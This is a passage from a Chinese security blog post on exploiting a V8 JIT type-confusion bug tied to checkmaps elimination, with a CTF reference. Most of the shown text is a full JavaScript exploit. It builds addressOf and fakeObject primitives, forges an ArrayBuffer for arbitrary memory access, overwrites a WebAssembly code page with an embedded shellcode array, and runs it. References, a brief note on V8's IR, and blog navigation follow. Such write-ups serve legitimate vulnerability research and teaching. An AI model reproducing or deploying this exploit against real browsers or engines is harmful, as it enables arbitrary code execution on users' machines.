class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_l(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_h(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(4,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf_opt(dict,f) &#123;</span><br><span class="line">   var x = dict.a;</span><br><span class="line">   f(dict);</span><br><span class="line">   return dict.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var double_dict = &#123;a:1.1&#125;;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;1);</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;2);</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var x = addressOf_opt(double_dict,(o)=&gt;&#123;o.a = obj&#125;);</span><br><span class="line">   return [u64_h(x),u64_l(x) - 0x1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function addressOf2_opt(dict,f) &#123;</span><br><span class="line">   var x = dict.a2;</span><br><span class="line">   f(dict);</span><br><span class="line">   return dict.a2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var double_dict2 = &#123;a2:1.1&#125;;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   addressOf2_opt(double_dict2,(o)=&gt;1);</span><br><span class="line">   addressOf2_opt(double_dict2,(o)=&gt;2);</span><br><span class="line">   addressOf2_opt(double_dict2,(o)=&gt;3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf2(obj) &#123;</span><br><span class="line">   var x = addressOf2_opt(double_dict2,(o)=&gt;&#123;o.a2 = obj&#125;);</span><br><span class="line">   return [u64_h(x),u64_l(x) - 0x1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function fakeObject_opt(dict,f,addr) &#123;</span><br><span class="line">   var x = dict.b;</span><br><span class="line">   f(dict);</span><br><span class="line">   dict.b = addr;</span><br><span class="line">   return dict;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var obj_dict = &#123;b:2.2&#125;;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;1,1.1);</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;2,2.2);</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;3,3.3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr_h,addr_l) &#123;</span><br><span class="line">   var obj1 = fakeObject_opt(obj_dict,(o)=&gt;&#123;o.b = obj;&#125;,p64f(addr_l+0x1,addr_h)).b;</span><br><span class="line">   return obj1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12];</span><br><span class="line">var d = addressOf(faker);</span><br><span class="line">var faker_addr_h = d[0];</span><br><span class="line">var faker_addr_l = d[1];</span><br><span class="line"></span><br><span class="line">print(&#x27;faker_addr=&#x27;+faker_addr_h.toString(16) + faker_addr_l.toString(16));</span><br><span class="line"></span><br><span class="line">d = addressOf2(func);</span><br><span class="line">var wasm_shellcode_ptr_addr_h = d[0];</span><br><span class="line">var wasm_shellcode_ptr_addr_l = d[1] + 0x38;</span><br><span class="line">print(&#x27;wasm_shellcode_ptr=&#x27; + wasm_shellcode_ptr_addr_h.toString(16) + wasm_shellcode_ptr_addr_l.toString(16));</span><br><span class="line"></span><br><span class="line">var element_addr_l = faker_addr_l + 0x40;</span><br><span class="line">print(&#x27;element_addr=&#x27; + faker_addr_h.toString(16) + element_addr_l.toString(16));</span><br><span class="line"></span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = p64f(0,0);</span><br><span class="line">faker[1] = p64f(0x0f00000a,0x001900c6);</span><br><span class="line">faker[2] = p64f(0x082003ff,0);</span><br><span class="line">faker[3] = p64f(0,0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = p64f(element_addr_l+0x1,faker_addr_h); //map</span><br><span class="line">faker[5] = p64f(0,0); //properties</span><br><span class="line">faker[6] = p64f(0,0); //elements</span><br><span class="line">faker[7] = p64f(0,0x100); //length</span><br><span class="line">faker[8] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);</span><br><span class="line">faker[9] = faker[8];</span><br><span class="line">faker[10] = p64f(0x100,0)</span><br><span class="line">faker[11] = p64f(0x4,0);</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObject(faker_addr_h,element_addr_l+0x20);</span><br><span class="line"></span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line"></span><br><span class="line">d = adv.getFloat64(0,true);</span><br><span class="line">var wasm_shellcode_addr_h = u64_h(d);</span><br><span class="line">var wasm_shellcode_addr_l = u64_l(d) + 0x5f;</span><br><span class="line"></span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));</span><br><span class="line">faker[8] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用</a><br><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2020/05/25/5ecbaa7260f9f/">redundancy elimination reducer in v8 and 34c3 ctf v9</a></p>
+<h2 id="0x05-感想"><a href="#0x05-感想" class="headerlink" title="0x05 感想"></a>0x05 感想</h2><p>在v8的JIT代码生成过程中，会使用IR来分析程序并且进行优化，v8的IR图使用<code>sea of node</code>思想，其中<code>checkmaps</code>节点是用来做<code>deoptimization</code>的依据，<code>checkmaps</code>节点用于检查对象类型是否符合，如果符合，则直接执行接下来的JIT代码，否则会使用<code>deoptimization</code>，以确保类型正确。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/29/v8-checkbounds/" rel="prev" title="v8的JIT边界检查(CheckBounds)消除的利用">
+      <i class="fa fa-chevron-left"></i> v8的JIT边界检查(CheckBounds)消除的利用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/01/11/issue-1051017/" rel="next" title="chrome issue 1051017 v8 逃逸">
+      chrome issue 1051017 v8 逃逸 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-patch%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x01 patch分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-POC%E6%9E%84%E9%80%A0"><span class="nav-number">3.</span> <span class="nav-text">0x02 POC构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%84%9F%E6%83%B3"><span class="nav-number">6.</span> <span class="nav-text">0x05 感想</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
